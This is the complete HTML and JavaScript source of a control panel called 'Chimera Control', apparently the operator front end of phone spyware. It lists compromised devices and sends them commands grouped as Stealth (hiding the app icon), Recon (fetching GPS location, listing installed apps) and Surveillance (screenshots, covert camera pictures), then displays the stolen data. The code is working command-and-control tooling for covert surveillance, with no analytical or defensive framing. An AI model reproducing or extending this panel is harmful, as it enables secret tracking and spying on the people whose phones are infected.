<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Chimera Control</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-primary: #0f172a;
            --bg-secondary: #1e293b;
            --bg-surface: #334155;
            --accent-blue: #60a5fa;
            --accent-green: #4ade80;
            --accent-red: #f87171;
            --text-primary: #f8fafc;
            --text-secondary: #94a3b8;
            --font-sans: 'Inter', sans-serif;
            --radius-sm: 8px;
            --radius-md: 12px;
            --radius-lg: 16px;
            --bottom-nav-height: 72px;
        }
        
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            background-color: var(--bg-primary);
            color: var(--text-primary);
            font-family: var(--font-sans);
            height: 100vh;
            height: 100dvh;
            overflow: hidden;
            -webkit-font-smoothing: antialiased;
        }
        
        #app {
            display: flex;
            flex-direction: column;
            height: 100%;
            position: relative;
        }
        
        /* Header */
        .app-header {
            padding: 16px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            background-color: var(--bg-primary);
            border-bottom: 1px solid rgba(148, 163, 184, 0.1);
            position: sticky;
            top: 0;
            z-index: 10;
        }
        
        .app-title {
            font-size: 1.25rem;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .app-title svg {
            width: 20px;
            height: 20px;
        }
        
        .status-indicator {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background-color: var(--accent-green);
            box-shadow: 0 0 0 2px rgba(74, 222, 128, 0.3);
        }
        
        /* Main Content */
        .main-content {
            flex: 1;
            overflow-y: auto;
            padding-bottom: var(--bottom-nav-height);
            -webkit-overflow-scrolling: touch;
        }
        
        /* Device List */
        .device-list {
            padding: 16px;
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        
        .device-card {
            background-color: var(--bg-secondary);
            border-radius: var(--radius-md);
            padding: 16px;
            display: flex;
            align-items: center;
            gap: 12px;
            transition: transform 0.2s ease;
        }
        
        .device-card:active {
            transform: scale(0.98);
        }
        
        .device-card.active {
            border-left: 4px solid var(--accent-blue);
        }
        
        .device-icon {
            width: 40px;
            height: 40px;
            background-color: var(--bg-surface);
            border-radius: var(--radius-sm);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .device-info {
            flex: 1;
        }
        
        .device-id {
            font-weight: 500;
            font-size: 0.9375rem;
            margin-bottom: 2px;
        }
        
        .device-status {
            font-size: 0.75rem;
            color: var(--text-secondary);
        }
        
        /* Command Grid */
        .command-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
            padding: 16px;
        }
        
        .command-card {
            background-color: var(--bg-secondary);
            border-radius: var(--radius-md);
            padding: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 12px;
            height: 120px;
            transition: transform 0.2s ease;
        }
        
        .command-card:active {
            transform: scale(0.98);
        }
        
        .command-icon {
            width: 36px;
            height: 36px;
            background-color: var(--bg-surface);
            border-radius: var(--radius-sm);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .command-label {
            font-size: 0.875rem;
            font-weight: 500;
            text-align: center;
        }
        
        /* Bottom Navigation */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            height: var(--bottom-nav-height);
            background-color: var(--bg-primary);
            border-top: 1px solid rgba(148, 163, 184, 0.1);
            display: flex;
            padding: 8px;
            z-index: 10;
        }
        
        .nav-button {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 4px;
            border-radius: var(--radius-sm);
            transition: background-color 0.2s ease;
        }
        
        .nav-button:active {
            background-color: var(--bg-surface);
        }
        
        .nav-button.active {
            color: var(--accent-blue);
        }
        
        .nav-icon {
            width: 24px;
            height: 24px;
        }
        
        .nav-label {
            font-size: 0.75rem;
            font-weight: 500;
        }
        
        /* Console */
        .console-view {
            padding: 16px;
        }
        
        .console-entry {
            font-family: monospace;
            font-size: 0.8125rem;
            line-height: 1.6;
            margin-bottom: 8px;
            display: flex;
            word-break: break-word;
        }
        
        .timestamp {
            color: var(--text-secondary);
            margin-right: 8px;
            flex-shrink: 0;
        }
        
        .cmd {
            color: var(--accent-blue);
        }
        
        .success {
            color: var(--accent-green);
        }
        
        .error {
            color: var(--accent-red);
        }
        
        /* Modal */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(15, 23, 42, 0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 20;
            padding: 16px;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.2s ease;
        }
        
        .modal-overlay.active {
            opacity: 1;
            pointer-events: all;
        }
        
        .modal-content {
            background-color: var(--bg-secondary);
            border-radius: var(--radius-lg);
            width: 100%;
            max-width: 400px;
            max-height: 80vh;
            overflow-y: auto;
            padding: 16px;
        }
        
        .modal-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
        }
        
        .modal-title {
            font-weight: 600;
            font-size: 1.125rem;
        }
        
        .modal-close {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: var(--bg-surface);
        }
        
        /* Utility Classes */
        .hidden {
            display: none !important;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 6px;
        }
        
        ::-webkit-scrollbar-track {
            background: transparent;
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--bg-surface);
            border-radius: 3px;
        }
    </style>
</head>
<body>
    <div id="app">
        <!-- Header -->
        <header class="app-header">
            <div class="app-title">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"></path><path d="M8.5 8.5v.01"></path><path d="M16 15.5v.01"></path><path d="M12 12v.01"></path><path d="M11 17v.01"></path><path d="M7 14v.01"></path></svg>
                <span>Chimera</span>
            </div>
            <div class="status-indicator"></div>
        </header>
        
        <!-- Main Content -->
        <main class="main-content">
            <!-- Devices View -->
            <div id="devices-view">
                <div class="device-list" id="device-list">
                    <!-- Devices will be populated here -->
                </div>
            </div>
            
            <!-- Commands View -->
            <div id="commands-view" class="hidden">
                <div class="command-grid" id="command-grid">
                    <!-- Commands will be populated here -->
                </div>
            </div>
            
            <!-- Console View -->
            <div id="console-view" class="hidden">
                <div class="console-view" id="console-output">
                    <!-- Console output will be populated here -->
                </div>
            </div>
        </main>
        
        <!-- Bottom Navigation -->
        <nav class="bottom-nav">
            <button class="nav-button active" data-view="devices">
                <svg class="nav-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>
                <span class="nav-label">Devices</span>
            </button>
            <button class="nav-button" data-view="commands">
                <svg class="nav-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 3a3 3 0 0 0-3 3v12a3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3H6a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3V6a3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3h12a3 3 0 0 0 3-3 3 3 0 0 0-3-3z"></path></svg>
                <span class="nav-label">Commands</span>
            </button>
            <button class="nav-button" data-view="console">
                <svg class="nav-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
                <span class="nav-label">Console</span>
            </button>
        </nav>
        
        <!-- Modal -->
        <div class="modal-overlay" id="modal-overlay">
            <div class="modal-content">
                <div class="modal-header">
                    <h3 class="modal-title" id="modal-title">Data Received</h3>
                    <button class="modal-close" id="modal-close">
                        <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
                    </button>
                </div>
                <div class="modal-body" id="modal-body"></div>
            </div>
        </div>
    </div>
    
    <script>
        // DOM Elements
        const deviceList = document.getElementById('device-list');
        const commandGrid = document.getElementById('command-grid');
        const consoleOutput = document.getElementById('console-output');
        const modalOverlay = document.getElementById('modal-overlay');
        const modalTitle = document.getElementById('modal-title');
        const modalBody = document.getElementById('modal-body');
        const modalClose = document.getElementById('modal-close');
        
        // View elements
        const devicesView = document.getElementById('devices-view');
        const commandsView = document.getElementById('commands-view');
        const consoleView = document.getElementById('console-view');
        const navButtons = document.querySelectorAll('.nav-button');
        
        // State
        const API_BASE = '/.netlify/functions';
        let devices = [];
        let selectedDevice = null;
        
        // Icons
        const ICONS = {
            device: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect><line x1="12" y1="18" x2="12.01" y2="18"></line></svg>`,
            stealth: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"></path><path d="M8.5 8.5v.01"></path><path d="M16 15.5v.01"></path><path d="M12 12v.01"></path><path d="M11 17v.01"></path><path d="M7 14v.01"></path></svg>`,
            recon: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line><line x1="11" y1="8" x2="11" y2="14"></line><line x1="8" y1="11" x2="14" y2="11"></line></svg>`,
            surveillance: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path></svg>`,
            hide: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path><line x1="1" y1="1" x2="23" y2="23"></line></svg>`,
            show: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>`,
            location: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path><circle cx="12" cy="10" r="3"></circle></svg>`,
            apps: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="6" height="6" rx="1"></rect><rect x="14" y="4" width="6" height="6" rx="1"></rect><rect x="4" y="14" width="6" height="6" rx="1"></rect><rect x="14" y="14" width="6" height="6" rx="1"></rect></svg>`,
            screenshot: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>`,
            camera: `<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>`
        };
        
        // Command definitions
        const COMMANDS = [
            {
                category: 'Stealth',
                icon: ICONS.stealth,
                commands: [
                    { 
                        label: 'Hide Icon', 
                        action: 'toggle_icon', 
                        payload: { show: "false" },
                        icon: ICONS.hide
                    },
                    { 
                        label: 'Show Icon', 
                        action: 'toggle_icon', 
                        payload: { show: "true" },
                        icon: ICONS.show
                    }
                ]
            },
            {
                category: 'Recon',
                icon: ICONS.recon,
                commands: [
                    { 
                        label: 'Get Location', 
                        action: 'get_location',
                        icon: ICONS.location
                    },
                    { 
                        label: 'List Apps', 
                        action: 'list_apps',
                        icon: ICONS.apps
                    }
                ]
            },
            {
                category: 'Surveillance',
                icon: ICONS.surveillance,
                commands: [
                    { 
                        label: 'Screenshot', 
                        action: 'screenshot',
                        icon: ICONS.screenshot
                    },
                    { 
                        label: 'Take Picture', 
                        action: 'picture', 
                        payload: { camera_id: "0" },
                        icon: ICONS.camera
                    }
                ]
            }
        ];
        
        // Core Functions
        const log = (message, type = 'info') => {
            const timestamp = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.className = 'console-entry';
            entry.innerHTML = `
                <span class="timestamp">${timestamp}</span>
                <span class="${type}">${message}</span>
            `;
            consoleOutput.appendChild(entry);
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        };
        
        const fetchDevices = async () => {
            log('Querying for active devices...');
            try {
                const response = await fetch(`${API_BASE}/get-devices`);
                if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                devices = await response.json();
                renderDeviceList();
                log(`Found ${devices.length} devices.`, 'success');
                if (devices.length > 0 && !selectedDevice) {
                    selectDevice(devices[0]);
                } else if (devices.length === 0) {
                    selectedDevice = null;
                }
            } catch (error) {
                log(`Error fetching devices: ${error.message}`, 'error');
            }
        };
        
        const sendCommand = async (action, payload = {}) => {
            if (!selectedDevice) return log('No device selected', 'error');
            
            const commandPayload = { token: selectedDevice.token, action, ...payload };
            log(`Sending command: ${action}`, 'cmd');
            
            try {
                const response = await fetch(`${API_BASE}/send-command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(commandPayload)
                });
                
                const result = await response.json();
                if (!response.ok) throw new Error(result.error || `Server responded with ${response.status}`);
                
                log(`Command sent successfully`, 'success');
                setTimeout(fetchDeviceData, 3000);
            } catch (error) {
                log(`Command failed: ${error.message}`, 'error');
            }
        };
        
        const fetchDeviceData = async () => {
            if (!selectedDevice) return;
            
            log('Checking for new data...');
            try {
                const response = await fetch(`${API_BASE}/get-device-data?deviceId=${selectedDevice.deviceId}`);
                if (!response.ok) throw new Error(`Server responded with ${response.status}`);
                
                const data = await response.json();
                if (data.length === 0) return log('No new data received');
                
                log(`Received ${data.length} data items`, 'success');
                const latestItem = data[data.length - 1];
                renderModal(latestItem);
            } catch (error) {
                log(`Error fetching data: ${error.message}`, 'error');
            }
        };
        
        // UI Rendering
        const renderDeviceList = () => {
            deviceList.innerHTML = devices.map(device => `
                <div class="device-card ${selectedDevice?.deviceId === device.deviceId ? 'active' : ''}" 
                     data-device-id="${device.deviceId}">
                    <div class="device-icon">
                        ${ICONS.device}
                    </div>
                    <div class="device-info">
                        <div class="device-id">${device.deviceId}</div>
                        <div class="device-status">Active</div>
                    </div>
                </div>
            `).join('');
        };
        
        const renderCommands = () => {
            commandGrid.innerHTML = COMMANDS.flatMap(category => 
                category.commands.map(command => `
                    <div class="command-card" 
                         data-action="${command.action}" 
                         data-payload='${command.payload ? JSON.stringify(command.payload) : '{}'}'>
                        <div class="command-icon">
                            ${command.icon}
                        </div>
                        <div class="command-label">${command.label}</div>
                    </div>
                `)
            ).join('');
        };
        
        const renderModal = (item) => {
            modalTitle.textContent = item.dataType.toUpperCase();
            let content = '';
            
            if (item.dataType === 'location') {
                const { latitude, longitude } = item.payload;
                content = `
                    <p style="margin-bottom: 16px;">
                        <a href="https://www.google.com/maps?q=${latitude},${longitude}" target="_blank">
                            Open in Maps
                        </a>
                    </p>
                    <pre>${JSON.stringify(item.payload, null, 2)}</pre>
                `;
            } else if (item.dataType === 'screenshot') {
                content = `<img src="data:image/jpeg;base64,${item.payload}" style="width: 100%; border-radius: 8px;">`;
            } else {
                content = `<pre>${JSON.stringify(item.payload, null, 2)}</pre>`;
            }
            
            modalBody.innerHTML = content;
            modalOverlay.classList.add('active');
        };
        
        // Event Handlers
        const selectDevice = (device) => {
            selectedDevice = device;
            renderDeviceList();
            renderCommands();
        };
        
        const switchView = (view) => {
            devicesView.classList.toggle('hidden', view !== 'devices');
            commandsView.classList.toggle('hidden', view !== 'commands');
            consoleView.classList.toggle('hidden', view !== 'console');
            
            navButtons.forEach(btn => {
                btn.classList.toggle('active', btn.dataset.view === view);
            });
        };
        
        // Event Listeners
        deviceList.addEventListener('click', (e) => {
            const card = e.target.closest('.device-card');
            if (card) {
                const device = devices.find(d => d.deviceId === card.dataset.deviceId);
                if (device) {
                    selectDevice(device);
                    switchView('commands');
                }
            }
        });
        
        commandGrid.addEventListener('click', (e) => {
            const card = e.target.closest('.command-card');
            if (card) {
                const action = card.dataset.action;
                const payload = card.dataset.payload ? JSON.parse(card.dataset.payload) : {};
                sendCommand(action, payload);
            }
        });
        
        navButtons.forEach(button => {
            button.addEventListener('click', () => {
                switchView(button.dataset.view);
            });
        });
        
        modalClose.addEventListener('click', () => {
            modalOverlay.classList.remove('active');
        });
        
        // Initialize
        window.addEventListener('load', () => {
            log('Chimera Control initialized');
            renderCommands();
            fetchDevices();
            
            // Refresh devices every 30 seconds
            setInterval(fetchDevices, 30000);
        });
    </script>
